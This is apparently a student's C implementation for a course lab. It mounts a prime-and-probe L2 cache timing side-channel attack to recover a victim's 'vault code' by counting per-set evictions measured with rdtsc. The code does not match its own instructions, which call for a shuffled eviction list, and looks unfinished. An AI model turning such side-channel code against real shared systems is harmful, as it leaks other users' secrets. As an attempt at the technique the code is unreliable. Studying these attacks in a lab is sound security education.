/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 *
 *  thief.c is the attacker implementation. You need to add the code for 
 *  prime_probe_l2_set_new()
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>

void printBinary(uint64_t num) {
  for (int i = 63; i >= 0; i--) {
    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
    if (i % 8 == 0) {
      putchar(' ');
    }
  }
  putchar('\n');
}

// Read the Time Stamp Counter
static inline uint64_t rdtsc() {
  uint32_t lo, hi;
  asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)hi << 32) | lo;
}

/**
 * Busy wait for an approximate number of cycles.
 * invariant: the number of cycles spent in this function is the least amount of cycles it should wait
 * */
void busy_wait_cycles(uint64_t cycles) {
  uint64_t start = rdtsc();
  while ((rdtsc() - start) < cycles) {
    // Busy wait
  }
}



// you will need to generate an eviction linked list structure with next,
// previous pointers and time measurements
// then you can use the shuffle function to randomize the access pattern 
// and avoid prefetchers being activated
// then traverse the list for prime and probe
// you might want to consider adding some delay between steps
// finally you need to traverse the list one more time to retrieve 
// the time measurements
bool prime_probe_l2_set(int set, char *buf) {
  bool found = false;
  uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
  uint32_t timing;
  uint64_t lineAddr;
  uint64_t start=0, end =0;
  uint64_t weighted_avg;
  for (int i = 0; i < L2_WAYS; i++) {
    // Set the first byte of each line to 1
    lineAddr = addr + i * L2_LINE_SIZE;

    start = rdtsc();
    for (int f = 0; f < 64; f++) {
      (*((char *)lineAddr+f)) ++;
    }
    end = rdtsc();
    busy_wait_cycles((end-start)*3); // 78 cycles is the average time to access a line in the cache by the vault
    timing = measure_line_access_time(lineAddr);

    weighted_avg = ((end-start)/16)+4;

    if (set == 992 || set == 209 ) {
      printf("Time: %ld\n", (end-start));
      printf("Address = %ld, set %d  timing = %d, weighted_avg = %ld (%ld) \n", lineAddr, set, timing
                                    , weighted_avg, timing - weighted_avg);
    }

    if(timing > weighted_avg){
      found = true;
    }
  }

  return found;
}


int main(int argc, char const *argv[]) {
    void *buf = NULL;
    int buf_size = 1 << 21;
    if (posix_memalign(&buf, 1 << 21, buf_size)) { // Allocates 2MB aligned memory, begins at 0x200000
        perror("posix_memalign");
    }
    madvise(buf, buf_size, MADV_HUGEPAGE);
    *((char *)buf) = 5;

    int evict_count[L2_SETS];
    for (int i = 0; i < L2_SETS; i++) {
        evict_count[i] = 0;
    }

    int num_reps = 100;
    for (int rep = 0; rep < num_reps; rep++) {
        for (int set = 0; set < L2_SETS; set++) {
            if (prime_probe_l2_set(set, buf)) {
                evict_count[set]++;
            }
        }
    }


    int max_val = 2;
    int max_set = -1;
    for (int set = 0; set < L2_SETS; set++) {
      uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
//      if(evict_count[set] > 995) {
        printf(" set addr = %ld, set number = %d , evict_count = %d\n",addr, set, evict_count[set]);
//      }

      if (evict_count[set] > max_val) {
        max_val = evict_count[set];
        max_set = set;
        uint64_t addr = (uint64_t) (buf + (set * L2_WAYS * L2_LINE_SIZE));
        printBinary(addr);
        printf(" set addr = %ld, set number = %d , evict_count = %d\n",addr, set, evict_count[set]);
      }
    }
    printf("Vault code: %d (%d)\n", max_set, max_val);
}
